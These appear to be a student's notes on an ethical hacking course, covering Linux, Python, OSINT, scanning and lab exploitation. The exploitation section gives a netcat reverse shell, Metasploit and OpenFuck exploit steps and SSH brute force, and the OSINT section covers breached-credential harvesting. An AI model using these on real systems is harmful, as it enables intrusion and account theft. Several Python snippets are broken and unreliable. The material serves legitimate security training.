
# Practical Ethical Hacking - The Complete Course



## Before We Begin

### PNPT Certification Path Progression

Many students take this course to obtain the [Practical Network Penetration Tester (PNPT)](https://certifications.tcm-sec.com/pnpt/) certification



## Introduction



### Course Introduction

Course exists since 2018. Last update in 2022.



### Course Discord (Important)

Course Discord - [TCM Security](https://discord.gg/tcm)

## 

### A Day in the Life of an Ethical Hacker



#### Assessment: External Network Pentest

- Assessing an organization's security from the outside looking in

- Methodology focused heavily on Open-Source Intelligence (OSINT) Gathering

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Internal Network Pentest

- Assessing an organization's security from inside of the network

- Methodology focused heavily on Active Directory attacks

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Web Application Pentest

- Assessing an organization's web application security

- Methodology focused heavily on web-based attacks and the OWASP testing guidelines

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Wireless Pentest

- Assessing an organization's wireless network security

- Methodology depends on wireless type being used (guest vs WPA2-PSK vs WPA2 Enterpreise)

- Typically last 4-8 hours per SSID with another 2-4 for report writing



#### Assessment: Physical Pentest & Social Engineering

- Assessing an organization's pysical security and / or end-user training

- Methodology depends on task and goals

- Typically last 16-40 hours with another 4-8 for report writing



#### Other Assessments

- Mobile Penetration Testing

- IoT Penetration Testing

- Read Team Engagements

- Purple Team Engagements

- Plus more



#### Report Writing

- A report is typically delivered within a week after the engagement ends

- Report shouold highlight both non-technical (executive) and technical findings

- Recommendations for remediation should be clear to both executives and technical staff



#### Debrief

- A debrief walks through your report findings. This can be with technical and non-technical staff present.

- It gives an opportunity for the client to ask questions and address any concerns before a final report is released. 



### Why You Shouldn't Be An Ethical Hacker

- Starting Salery 102'000$

- Go up fast to 140'000$

- Always have to stay up to date. Study whole time. Always new type of attacks!

- Have to be good in communication. Especially to non-technical peoples. 



## Notekeeping

### Effective Notekeeping

![[Pasted image 20221211124455.png]]

> [!hint] 
>  https://obsidian.md/

### Important Tools

> [!important] 
>  Best Screenshot Tool for Windows, Mac & Linux 
>  https://flameshot.org/#download

> [!tip] 
> Invert Screenshots if background is black if you put it into a report  

> [!info] 
> Pixelate important information such Password 

![[Pasted image 20221211144630.png]]




## Networking Refresher

### Introduction

- IP Address
- MAC Address
- TCP, UDP, and the Three-Way Handshake
- Common Ports and Protocols
- The OSI Model
- Subnetting

### IP Addresses

> [!info] 
> IP Address is on OSI Layer 3 

> [!hint] 
>  Show IP Information in Linux
`ifconfig`

![[Pasted image 20221211155524.png]]


### MAC Addresses

> [!abstract] 
> MAC stands for Media Access Control 

> [!info] 
> MAC Address is on OSI Layer 2 and is related to switching 

> [!hint] 
> Mac Address Lookup:
> https://maclookup.app/ 


## TCP, UDP, and the Three-Way Handshake

> [!abstract] 
> TCP = Transmission Control Protocol
> UDP = User Datagram Protocol 

> [!info] 
> TCP & UDP Is on OSI Layer 4 

> [!note] 
> **How does a Three-Way Handshakre look like:**
> SYN > SYN ACK > ACK
> 
> Hello > Hey SYN I acknowledge you (neighbor waving hello back)  > Acknowledgement (Start Conversation)
> 


## Common Ports and Protocols

> [!abstract] 
> **TCP:**
> -  FTP (21)
> - SSH (22)
> - Telnet (23)
> - SMTP (25)
> - DNS (53)
> - HTTP (80) / HTTPS (443)
> - POP (110)
> - SMB (139+445)
> - IMAP (143)

> [!abstract] 
> **UDP:** 
> - DNS (53)
> - DHCP (67, 68)
> - TFTP (69)
> - SNMP (161)



### The OSI Model

> [!hint] 
> OSI Seven Layers (**p**lease **d**o **n**ot **t**hrow **s**ausage **p**izza **a**way) 
> 1 -> Physical Layer - Data Cables, Cat6
> 2 -> Data Layer - Switching, MAC Address
> 3 -> Network Layer - IP Address, Routing
> 4 -> Transport Layer - TCP/UDP 
> 5 -> Session Layer - Session Management
> 6 -> Presentation Layer -> WMV, JPEG, MOV
> 7 -> Application Layer -> HTTP, SMTP


### Subnetting Part 1

> [!tip] 
> Subnet Guide (Excel)
> https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view 
>
> [[Subnet-Guide.xlsx]]

![[Pasted image 20221211171634.png]]

![[Pasted image 20221211171852.png]]

![[Pasted image 20221211173023.png]]


> [!tip] 
> IP Address Guide:
> https://www.ipaddressguide.com/cidr 

![[Pasted image 20221211180441.png]]

#### Seven Second Subnetting

> [!hint] 
> Professor Messer - Seven Second Subnetting 
> https://www.youtube.com/watch?v=ZxAwQB8TZsM

![[Pasted image 20221211182030.png]]
![[Pasted image 20221211182202.png]]
![[Pasted image 20221211182459.png]]
![[Pasted image 20221211182754.png]]
![[Pasted image 20221211182902.png]]
![[Pasted image 20221211192715.png]]
![[Pasted image 20221211192819.png]]
![[Pasted image 20221211193102.png]]


## Subnetting Part 2

![[Pasted image 20221211195803.png]]


## Setting Up Our Lab

### Installing VMWare / VirtualBox


> [!summary] 
> VMware: [https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html](https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html)
>VirtualBox: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)


### Configuring VirtualBox

> [!info] 
> Create new NAT Network for every VM
> 


### Installing Kali Linux

> [!summary] 
> Download Kali - [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali#kali-virtual-machines)
> Download 7zip - [https://www.7-zip.org/download.html](https://www.7-zip.org/download.html)


## Introduction to Linux

### Exploring Kali Linux

> [!summary] 
> Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering. 

![[Pasted image 20221217135615.png]]


### Sudo Overview

> [!note] 
> Show Password File in Linux
>`cat /etc/shadow` -> Permission denied
>  `sudo cat /etc/shadow` -> You see content because your root (after type root password)

> [!note] 
> Run current session in Terminal always as root:
> `sudo su -`
> 

![[Pasted image 20221217140635.png]]


### Navigating the File System

> [!note] 
> Show current path in terminal:
> `pwd`
> -> /home/kali 

> [!note] 
> Change dictionary:
> `cd ..` ->  Go one folder up
>  `cd nameOfFolder` -> Go into this folder
>  `cd /home/kali` -> Go into this folder by absolute path

> [!note] 
> List content of current folder:
> `ls` -> Simple folder listing
> `ls -la` -> Complex folder listing including file permissions

> [!note] 
> Create Folder:
> `mkdir myNewFolderName` 

> [!note] 
> Remove Folder:
> `rmdir myNewFolderName`

> [!hint] 
>explainshell.com 
>Write down a command-line to see the help text that matches each argument 
 https://explainshell.com 

![[Pasted image 20221217142755.png]]

> [!note] 
> Show Help (Manual) for a command:
> `man ls` 
> `man mkdir`
> or 
> `ls --help`
> `mkdir --help`

> [!note] 
> Print out String:
> `echo 'Hi!'` 
>  `echo 'Hi!' > test.txt` -> Save this Text to file test.txt
> ` cat test.txt
`

> [!note] 
> Copy file to other folder:
>  `cp test.txt Downloads`

> [!note] 
>  Delete File
> ` rm Downloads/test.txt`

> [!note] 
> Move file to other location 
> `mv test.txt Downloads` 

> [!note] 
>  Locate file (search where a file is)
>  `locate test.txt`
>But as we just created this file, locate DB is not updated.
>`sudo updatedb` -> Index all files 

> [!note] 
> Change Password for current user
> `passwd`
> 


### Users and Privileges

![[file_permission_image2-3130722148.png]]

![[c16b1-permissions-1771186171.jpg]]

> [!note] 
> Change Permission of file:
> `chmod +rwx script.sh`  -> Read, write, execute permissions
> or
>` chmod 777 script.sh -> Full permisson for everyone`

![[Pasted image 20221217150406.png]]

> [!note] 
> Add new user to system
> `sudo adduser john` -> You need sudo password, after password for new user
> Now use john account
> `su john`

> [!important] 
> /etc/passwd explained  

![[etc_passwd-4204861671.png]]

> [!important] 
> /etc/shadow explained 

![[shadow-file-format-022022-01-4257132506.png]]

> [!note] 
> Edit sudo
> `sudo cat /etc/sudoers`
> Find out which group has sudo:
> `grep 'sudo' /etc/group`
> Check places I can execute commands with current user:
>` sudo -l`


### Common Network Commands

> [!note] 
> Show IP Information (ip a is new way)
> `ip a` 
> or old way
> `ifconfig`

> [!note] 
> Show Wlan Adapter  
> `iwconfig`

> [!note] 
> Show ARP information
> `ip n`
> or 
> `arp a` 

> [!hint] 
> ARP is telling which IP Address has which MAC Address
> 

> [!note] 
> Kernel IP routing table
> `route`
> 


### Viewing, Creating, and Editing Files

> [!note] 
> Write Text to File 
> `echo "hallo" > hey.txt` 
> To add text to existing file:
>  `echo "hallo" >> hey.txt` 

> [!note] 
> Create new empty file
> `touch newfile.txt` 

> [!tip] 
> Use `nano` editor in terminal to edit files
> 

> [!hint] 
> Open file  in GUI Editor
> `gedit newfile.txt`
> New GUI Editor alternative:
> `mousepad newfile.txt`
> 
> 


### Starting and Stopping Services

> [!note] 
> Start apache2 webserver
> `sudo service apache2 start` 
> Stop apache2 webserver
> `sudo service apache2 stop` 
> Path to www root
> `cd /var/www/html`

> [!tip] 
> Start Webserver in current folder
> `python3 -m http.server 80` 


> [!note] 
> Enable SSH Service
> `sudo systemctl enable ssh`
> Disable SSH Service
> `sudo systemctl disable ssh`


### Installing and Updating Tools

> [!note] 
> Update Kali Linux System via apt
> `sudo apt update && sudo apt upgrade` 

> [!tip] 
> With apt command you can install new software:
> `apt install nameOfSoftwareToInstall` 

> [!hint] 
> Example to find new software: Google for "Office 365 brute force github" 

> [!important] 
>  Pimpmykali Script from GitHub:
>  https://github.com/Dewalt-arch/pimpmykali
>  `git clone https://github.com/Dewalt-arch/pimpmykali.git`
>  `sudo ./pimpmykali.sh`
>  

![[Pasted image 20221218171941.png]]


### Scripting with Bash

> [!tip] 
> Create Sash Script for IP Sweep using OpenAI:
> https://chat.openai.com/chat

``` 
#!/bin/bash

# Set the range of IP addresses to scan
ip_range="192.168.1.1-255"

# Set the Slack webhook URL
webhook_url="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

# Use nmap to perform the IP sweep
nmap -sP $ip_range | while read line
do
  # Check for online or offline status
  if [[ $line =~ "Host is up" ]]
  then
    # Send message to Slack indicating that a device is online
    curl -X POST -H 'Content-type: application/json' --data '{"text":"A device has come online"}' $webhook_url
  elif [[ $line =~ "Host is down" ]]
  then
    # Send message to Slack indicating that a device is offline
    curl -X POST -H 'Content-type: application/json' --data '{"text":"A device has gone offline"}' $webhook_url
  fi
done
```

![[Pasted image 20221218175259.png]]
![[Pasted image 20221218175325.png]]

And here Solution from Course:

``` 
#!/bin/bash
if [ "$1" == "" ]
then
echo "You forgot an IP address!"
echo "Syntax: ./ipsweep.sh 192.168.1"

else
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & 
done
fi
```


> [!note] 
> Store Results to text file
> `./ipsweep.sh 192.168.2 > ips.txt` 



## Introduction to Python

### Introduction

![[Pasted image 20221223145037.png]]


### Strings

``` 
#!/bin/python3

#Print string
print("Hello, World!")
print('Hello, World!')
print("""This string runs
multiple lines!""")
print("This string is "+"awesome!")
print("\n") # print new line
print("Test that new line out.")
```


### Math

``` 
#!/bin/python3

print(50 + 50) # add
print(50 - 50) # subtract
print(50 * 50) # multiply
print(50 / 50) # divide
print(50 + 50 - 50 * 50 / 50) # PEMDAS
print(50 ** 2) # exponents
print(50 % 6) # modulo - takes what is left over
print(50 / 6) #division with remainder (or a float)
print(50 // 6) # no remainder
```


### Variables and Methods

``` 
#!/bin/python3

quote = "All is fair in love and war"
print(quote)
print(quote.upper()) # uppercase
print(quote.lower()) # lowercase
print(quote.title()) # title case
print(len(quote)) # counts characters
name = "Peter" # string
age = 33 # int
gpa = 3.7 # float - has a devimal
print(int(age))
print(int(30.1))
print(int(30.9)) # Will it round? NO.
print("My name is " + name + " and I am " + str(age) + " years old.")
age += 1
print("My name is " + name + " and I am " + str(age) + " years old.")
birthday = 1
age += birthday
print("My name is " + name + " and I am " + str(age) + " years old.")
```


###  Functions

``` 

#!/bin/python3

def who_am_i(): # this is a fuction without parameters
   name = "Peter" # local variable
   age = 30
   print("My name is " + name + " and I am " + str(age) + " years old.")

who_am_i()

def add_one_hundred(num):
   print(num + 100)

add_one_hundred(100)

def add(x,y):
   print(x + y)

add(7,7)

def multiply(x,y):
   return x * y

print(multiply(7, 7))

def square_root(x):
   print(x ** .5)

square_root(64)

def new_line():
   print("\n")
  
new_line()
```


###  Boolean Expressions and Relational Operators

![[Pasted image 20221223171602.png]]

``` 
#!/bin/python3

bool1 = True
bool2 = 3*3 == 9
bool3 = False
bool4 = 3*3 != 9
print(bool1, bool2, bool3, bool4)
print(type(bool1))
bool5 = "True"
print(type(bool5))

greater_than = 7 > 5
less_than = 5 < 7
greater_than_equal_to = 7 >= 7
less_than_equal_to = 7 <= 7

test_and = (7 > 5) and (5 < 7) # True
test_and2 = (7 > 5) and (5 > 7) # False
test_or = (7 > 5) or (5 < 7) # True
test_or2 = (7 > 5) or (5 > 7) # True
  
test_not = not True # False
```


### Conditional Statements

``` 
#!/bin/python3

def drink(money):
   if money >= 2:
      return "You've got yourself a drink!"
   else:
      return "No drink for you!"

print(drink(3))
print(drink(1))

def alcohol(age,money):
    if (age >= 21) and (money >= 5):
      return "We're getting a drink!"
   elif (age >= 21) and (money < 5 ):
      return "Come back with more money"
   elif (age < 21) and (money >= 5):
      return "Nice try, kid!"
   else:
      return "You're too young and too poor."

print(alcohol(21, 5))
print(alcohol(21, 2))
print(alcohol(19, 5))
print(alcohol(19, 1))
```


## Lists


``` 
#!/bin/python3

movies = ["When Harry Met Sally", "The Hangover", "SWAT", "The Rock"]
print(movies[0]) # return first item in list
print(movies[1]) # return second item in list
print(movies[1:3]) # return first index number given right until last number, but not include last number
print(movies[1:])
print(movies[:1])
print(movies[-1])
print(len(movies)) # count items in the list

movies.append("JAWS")
print(movies) # appends to the end of the list

movies.insert(2, "Hustle")
print(movies)

movies.pop() # removes the last item
print(movies)

movies.pop(0) # removes the first item
print(movies)

amber_movies = ['Matrix 1', 'Matrix 2']
our_favorites_movies = movies + amber_movies
print(our_favorites_movies)

grades = [["Bob", 82], ["Alice", 90], ["Jeff", 73]]
bobs_grades = grades[0][1]
print(bobs_grades)
grades[0][1] = 83
print(grades)
```


### Tuples

``` 
#!/bin/python3

# TUPLES - Do not change, ()
grades = ("a", "b", "c", "d", "f")
print(grades[1])
```

## Looping

``` 
#!/bin/python3

# For loops - start to finish of a iterate
vegetables = ["tomato", "spinach", "cabbage"]
for x in vegetables:
   print(x)

# ip = 1..254
# for x in ip:
#  ping 192.168.1.x
  

# While loops - execute as long as True
i = 1
while i < 10:
   print(i)
   i += 1
```


### Advanced Strings

``` 
#!/bin/python3

my_name = "Peter"
print(my_name[0]) # first letter
print(my_name[-1]) # last letter

sentence = "This is a sentence."
print(sentence[:4])
print(sentence.split()) # delimeter - default is a space

sentence_split = sentence.split()
sentence_join = ' '.join(sentence_split)
print(sentence_join)

quote = 'He said, "give me all your money"'
print(quote)

quote = "He said, \"give me all your money\""
print(quote)

too_much_space = " hello "
print(too_much_space.strip())

print("A" in "Apple") # True
print("a" in "Apple") # False

letter = "A"
word = "Apple"
print(letter.lower() in word.lower()) # improved

movie = "The Rock"
print("My favorite movie is {}.".formatmovie))

print("My favorite movie is %s" % movie)
print(f"My favorite movie is {movie}.")
```


### Dictionaries

``` 
#!/bin/python3

drinks = {"White Russian" : 7, "Old Fashioned": 10, "Beer": 1} # drink is key, price is the value
print(drinks)

employees = {"Finance": ["Bob", "Linda", "Tina"], "IT": ["Teddy", "Peter", "Hans"], "HR": ["Jimmy", "Mort"]}
print(employees)

employees['Legal'] = ["Mr. Frond"] # adds new key value pair
print(employees)
  
employees.update({"Sales": ["Andie", "Oli"]})
print(employees)

drinks['White Russian'] = 8
print(drinks)
print(drinks.get("White Russian"))
```


### Importing Modules

``` 
#!/bin/python3

import sys # system functions and parameters
from datetime import datetime as dt # import with alias

print(sys.version)
print(dt.now())
```


### Sockets

``` 
#!/bin/python3

import socket

HOST = '127.0.0.1'
PORT = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is ipv4, SOCK_STREAM is a port
s.connect((HOST,PORT))
```


### Building a Port Scanner


``` 
#!/bin/python3

import sys
import socket
from datetime import datetime

# Define our target
if len(sys.argv) == 2:
   target = socket.gethostbyname(sys.argv[1]) # Translate hostname to IPv4
else:
   print("Invalid amount of arguments.")
   print("Syntax: python3 scanner.py <ip>")

#Add a pretty banner
print("-" * 50)
print("Scaning target " + target)
print("Time started: " +str(datetime.now()))
print("-" * 50)

try:
for port in range(1,65535):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   socket.setdefaulttimeout(1)
   result = s.connect_ex((target, port))

   if result == 0:
      print(f"Port {port} is open")
   s.close()

except KeyboardInterrupt:
   print("\n Exiting program.")
   sys.exit()

except socket.gaierror:
   print("Hostname could not be resolved.")
   sys.exit()

except socket.error:
   print("Could not connect to server.")
   sys.exit()
```


### User Input

``` 
#!/bin/python3

name = input("Enter your name: ")
drink = input("What is your favorite drink? ")
print(f"Hello {name}! Have a {drink}")
```

``` 
#!/bin/python3

x = float(input("Give me a number: "))
o = input("Give me an operator: ")
y = float(input("Give me yet another number: "))

if o == "+":
   print(x + y)
elif o == "-":
   print(x - y)
elif o == "/":
   print(x / y)
elif o == "*":
   print(x * y)
elif o == "**" or o == "^":
   print(x ** y)
else:
   print("Unknown operator.")
```


### Reading and Writing Files

``` 
#!/bin/python3

months = open('months.txt')
print(months)
print(months.mode)
print(months.readable())
print(months.readline())
print(months.readline())
print(months.readlines())
print(months.readlines())
print(months.seek(0))
print(months.readlines())
print(months.seek(0))

for month in months:
   print(month.strip())

months.close()
```

``` 
#!/bin/python3

days = open('days.txt', "w") # write / override
days = open('days.txt', "a") # add to existing file
print(days)
print(days.mode)

days.write("Monday")
days.write("\nTuesday")

days.close()
```


### Classes and Objects

``` 
class Employees:

def __init__(self, name, department, role, salery, years_employed):
   self.name = name
   self.deparment = department
   self.role = role
   self.salery = salery
   self.years_employed = years_employed

def eligible_for_retirement(self):
   if self.years_employed >= 20:
      return True
   else:
      return False
```

``` 
#!/bin/python3

from Employees import Employees

e1 = Employees("Bob", "Sales", "Director of Sales", 100000, 20)
e2 = Employees("Linda", "Executive", "CIO", 150000, 10)

print(e1.name)
print(e2.role)

print(e1.eligible_for_retirement())
print(e2.eligible_for_retirement())
```

### Building a Shoe Budget Tool

``` 
#!/bin/python3

class Shoes:

def __init__(self, name, price):
   self.name = name
   self.price = float(price)

def budget_check(self, budget):
   if not isinstance(budget, (int, float)):
      print('Invalid entry. Please enter a number.')
      exit()

def change(self, budget):
   return (budget - self.price)

def buy(self, budget):
   self.budget_check(budget)
   if budget >= self.price:
      print(f'You can cop some {self.name}')
      if budget == self.price:
         print('You have exactly enough money for these shoes.')
      else:
         print(f'You can buy these shoes and have ${self.change(budget)} left over')
      exit('Thanks for using our shoe budget app!')
```


``` 
#!/bin/python3

from Shoes import Shoes

low = Shoes('Heels', 30)
medium = Shoes('Boots', 120)
high = Shoes('Sexy Heels', 400)

try:
   shoe_budget = float(input('What is your shoe budget? '))

except ValueError:
   exit('Please enter a number')

for shoes in [high, medium, low]:
   shoes.buy(shoe_budget)
```


## The Ethical Hacker Methodology

### The Five Stages of Ethical Hacking

![[Pasted image 20221224141322.png]]


## Information Gathering (Reconnaissance)

### Passive Reconnaissance Overview

![[Pasted image 20221224141847.png]]

> [!hint] 
> Live Satellite images
> https://zoom.earth/
> 

![[Pasted image 20221224150033.png]]


### Identifying Our Target

> [!hint] 
> Bug Bounty
> https://bugcrowd.com/programs 


### Discovering Email Addresses

> [!hint] 
> hunter.io to find E-Mails
> https://hunter.io/ 

![[Pasted image 20221224163352.png]]

> [!hint] 
>  https://phonebook.cz

![[Pasted image 20221224165407.png]]

> [!tip] 
> Useful for Password Sprying
> 

> [!hint] 
> https://clearbit.com/ Chrome Extension 
 

![[Pasted image 20221224170625.png]]

![[Pasted image 20221224170711.png]]

![[Pasted image 20221224170807.png]]

> [!hint] 
> ## Free email address verification tool
> https://tools.emailhippo.com/ 

![[Pasted image 20221224171400.png]]

> [!hint] 
> # Email Checker
> A simple tool to check whether an email address exists.
> https://email-checker.net/

![[Pasted image 20221224171609.png]]



> [!important] 
> Use Gmail Login Form to see if E-Mail Address is valid. If you come to this screen, it means Gmail Address is existing.  

![[Pasted image 20221224171848.png]]

> [!hint] 
> Make a Password Reset 

![[Pasted image 20221224172034.png]]


### Gathering Breached Credentials with Breach-Parse

> [!hint] 
> breach-parse from TCM Security
> https://github.com/hmaverickadams/breach-parse
> 

![[Pasted image 20221225085336.png]]
![[Pasted image 20221225085530.png]]


### Hunting Breached Credentials with DeHashed


> [!tip] 
>  https://dehashed.com/

![[Pasted image 20221225090829.png]]

![[Pasted image 20221225091138.png]]

> [!tip] 
> Searching for the hashed password on the website might take you to another name, such as the private account of the employee in question. It could also reflect the real password instead of the hashed password. 


> [!hint] 
> Hash to Password
> https://crackstation.net/
> 


### Hunting Subdomains Part 1

> [!info] 
> Install sublist3r tool:
> `sudo apt install sublist3r`
> 

![[Pasted image 20221225100424.png]]

> [!info] 
> Cert Search: https://crt.sh/
> 


### Hunting Subdomains Part 2



> [!hint] 
> In-depth Attack Surface Mapping and Asset Discovery
> https://github.com/OWASP/Amass 

![[Pasted image 20221225112445.png]]


> [!hint] 
> Take a list of domains and probe for working HTTP and HTTPS servers
>  https://github.com/tomnomnom/httprobe


### Identifying Website Technologies

> [!tip] 
> Online Check Web Technologies of Website:
> https://builtwith.com
> 

![[Pasted image 20221225135834.png]]

> [!hint] 
> Identify technologies on websites
> https://www.wappalyzer.com/ 
> (They have a good browser plugin)

> [!tip] 
> Kali Terminal
> `whatweb https://example.com` 
> Get Information about Website

![[Pasted image 20221225141254.png]]


### Information Gathering with Burp Suite

![[Pasted image 20221226121247.png]]


### Google Fu

> [!hint] 
> Google Search Operators: The Complete List (42 Advanced Operators)
> https://ahrefs.com/blog/google-advanced-search-operators/


### Utilizing Social Media

> [!hint] 
> Twitter and LinkedIn are good places to find Employee information.
> 

![[Pasted image 20221226152108.png]]

> [!tip] 
> Look for Badges, Notes on Desk or what kind of IT tools / OS they use. 

> [!hint] 
> If there is a big company, there is a big chance that someone of Employees use weak password. You can identify persion in data breach.
> 

> [!warning] 
> Information gathering is a very important part of penetration testing work!  


### Additional Learning (OSINT Fundamentals)

![[Pasted image 20221226154340.png]]


## Scanning & Enumeration


### Installing Kioptrix


> [!info] 
> Kioptrix Download - [https://tcm-sec.com/kioptrix](https://tcm-sec.com/kioptrix)
> 


> [!tip] 
> To find IP, you can login with `john` and `TwoCows2`.
> You can use ping to find out IP of VM. 


### Scanning with Nmap

> [!tip] 
>  Network discovery with arp-scan
>  `arp-scan -l`
>  or
>  `udo arp-scan -l -I vmnet8`

![[Pasted image 20221226160315.png]]

> [!note] 
> Scan Network with netdiscover
> `sudo netdiscover -r 192.168.2.0/24`
> 

![[Pasted image 20221226161520.png]]

> [!info] 
> # 3-Way Handshake - Accept Connection
> SYN SYNACK ACK
> 
> # Abort Connection
> SYN SYNACK RST 

> [!todo] 
> nmap Scan of VM:
> nmap -T4 -p- -A 172.16.215.128
> 

> [!todo] 
> nmap Scan of UDP:
> ` sudo nmap -sU -sV -T4 -p1000  172.16.215.128` 


### Enumerating HTTP and HTTPS Part 1

> [!info] 
> Poor Hygiene:
> Searching for a standard web server page tells us something about the technical hygiene of our customer. You should not run a web server if you do not use a web server. 
> 

![[Pasted image 20221226165042.png]]

> [!info] 
> Information Dislclosure of Webserver Version 

![[Pasted image 20221226165410.png]]

> [!important] 
> Nikto Scan:
> `nikto -url "http://172.16.215.128/"` 


### Enumerating HTTP and HTTPS Part 2

> [!info] 
> DirBuster Enumeration 

![[Pasted image 20221226171851.png]]



### Enumerating SMB

> [!tip] 
> enum4linux scan:
> `enum4linux 172.16.215.128` 

![[Pasted image 20221226173530.png]]

> [!info] 
> To start Metasploit:
> run `msfconsole` 

![[Pasted image 20221226174357.png]]

> [!info] 
> auxiliary = scanning / enumeration 
> post = post exploitation modules
> exploits = get shell on machine

> [!todo] 
> Search for SMB scanner:
> `search smb type:auxiliary`
> Use Modul:
> `use auxiliary/scanner/smb/smb_version` 
>`show options` 
>`set rhost 172.16.215.128`
>`run`

![[Pasted image 20221226175739.png]]

> [!info] 
> Anonymously connect to the SMB server:
>  `smbclient -L \\\\172.16.215.128`

![[Pasted image 20221226180058.png]]

> [!info] 
> Try to connect to ADMIN$ shared folder:
>  `smbclient  \\\\172.16.215.128\\ADMIN$`

![[Pasted image 20221226180525.png]]

> [!info] 
> Try to connect to IPC$ shared folder (normally isn't so helpful this one): 
> `smbclient  \\\\172.16.215.128\\IPC$ `

![[Pasted image 20221226180652.png]]

> [!note] 
> Nothing to see here...
> 


### Enumerating SSH


> [!important] 
> Sometimes old SSH Server will have this Error Message:
> `Unable to negotiate with 172.16.215.128 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
`

![[Pasted image 20221226203834.png]]

> [!attention] 
> It didn't work as they showed in Video. But this here is working for me:
> `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc  172.16.215.128
` 


### Researching Potential Vulnerabilities


> [!tip] 
> Google for Exploit:
> `mod_ssl 2.8.4 exploit`
> `samba 2.2.1a exploit`

> [!hint] 
> Use searchsploit in Terminal:
> `searchexploit` # go to exploit folder on your kali machine
> `searchsploit Samba` 
> `cat exploits/linux_x86/dos/36741.py` # direct access to exploit on your machine

![[Pasted image 20221226210218.png]]

![[Pasted image 20221226210803.png]]


### Our Notes So Far

![[Pasted image 20221226211017.png]]




## Vulnerability Scanning with Greenbone Community Edition (OpenVAS)

> [!info] 
>  Tutorial how to Setup Docker OpenVAS
>  https://greenbone.github.io/docs/latest/index.html
>  Start OpenVAS Docker
>  `docker-compose -f ~/Scripts/OpenVAS/docker-compose.yml -p greenbone-community-edition up -d`
>  

![[Pasted image 20221226222439.png]]


## Vulnerability Scanning with Nessus


### Scanning with Nessus Part 1

> [!info] 
>  Download Nessus:
>  https://www.tenable.com/downloads/nessus?loginAttempted=true
>  Install it:
>  `sudo dpkg -i Nessus-10.4.1-ubuntu1404_amd64.deb`
>  Start Nessus Service:
>  `/bin/systemctl start nessusd.service`
>  Open in browser:
>  `https://hostname:8834/#/`
>  Choose Nessus Essentials

![[Pasted image 20221226222505.png]]


### Scanning with Nessus Part 2

![[Pasted image 20221226224135.png]]

> [!tip] 
> Go and check founded version numbers manually by yourself. Don't trust vuln scanner on this.  


## Exploitation Basics


### Reverse Shells vs Bind Shells

![[Pasted image 20221227104723.png]]
![[Pasted image 20221227105144.png]]


> [!note] 
> **Reverse Shell:**
> Open Netcat listener:
> `nc -nvlp 4444`
> Connect to listener:
>  `nc 192.168.2.133 4444 -e /bin/bash`

> [!note] 
> **Bind Shell:** 
> On victim:
> `nc -nvlp 4444 -e /bin/bash`
> On attacker:
> `nc 192.168.2.133 4444`


### Staged vs Non-Staged Payloads

![[Pasted image 20221227110739.png]]

> [!caution] 
> If exploit isn't working, try other type of payload! 


### Gaining Root with Metasploit

> [!todo] 
>  `searchsploit samba 2.2 `
>  `msfconsole`
>  `search trans2open`
>  `use 1`
>  `show options`
>  `set rhost  172.16.215.1`
>  `run`
>  Isn't working. We have to change payload
>  `set payload linux/x86/`
>  `set payload linux/x86/shell_reverse_tcp`
>  `show options`
>  `run` or `exploiot`


![[Pasted image 20221227111500.png]]
![[Pasted image 20221227111621.png]]

![[Pasted image 20221227112420.png]]
![[Pasted image 20221227112720.png]]
![[Pasted image 20221227113010.png]]


### Manual Exploitation

> [!note] 
> Google OpenLuck:
> https://github.com/heltonWernik/OpenLuck
> 

> [!todo] 
> `git clone https://github.com/heltonWernik/OpenFuck.git` 
> `apt-get install libssl-dev`
> `cd OpenFuck`
> `gcc -o OpenFuck OpenFuck.c -lcrypto`
> `./open 0x6a 192.168.80.145 443 -c 40`
> `./open 0x6b 172.16.215.128 -c 40`

![[Pasted image 20221227132312.png]]


### Brute Force Attacks


> [!todo] 
> Hydra Brute Force SSH:
> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.16.215.128:22 -t 4 -V
` 

> [!attention] 
> Hydra didn't work with this SSH Server. In Video it's working.  

> [!todo] 
>  SSH Burte Force SSH via Metasploit
>  `msfconsole`
>  `search ssh`
>  `use auxiliary/scanner/ssh/ssh_login`
>  `show options`
>  `set username root`
>  `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
>  `set rhost 172.16.215.128`
>  `set threads 10`
>  `set verbose true`
>`run`

![[Pasted image 20221227145327.png]]


### Credential Stuffing and Password Spraying

![[Pasted image 20221227145849.png]]

> [!tip] 
> Install FoxyProxy in Firefox or Chrome:
> https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/
> 

> [!todo] 
> Get breached credentials:
> `breach-parse tessla.com tessla.txt`

![[Pasted image 20221227151810.png]]
![[Pasted image 20221227151854.png]]
![[Pasted image 20221227152001.png]]
![[Pasted image 20221227152157.png]]
![[Pasted image 20221227152242.png]]
![[Pasted image 20221227152324.png]]


### Our Notes, Revisited

![[Pasted image 20221227163027.png]]
![[Pasted image 20221227163231.png]]


## New Capstone

> [!info] 
> Old PEH Capstone VMs:
> https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH
> DEV VM:
> https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0
> Old Capstone Videos:
> https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor
> 


![[Pasted image 20221227164253.png]]


### Set Up - Blue

> [!info] 
> 2GB Ram is enouth
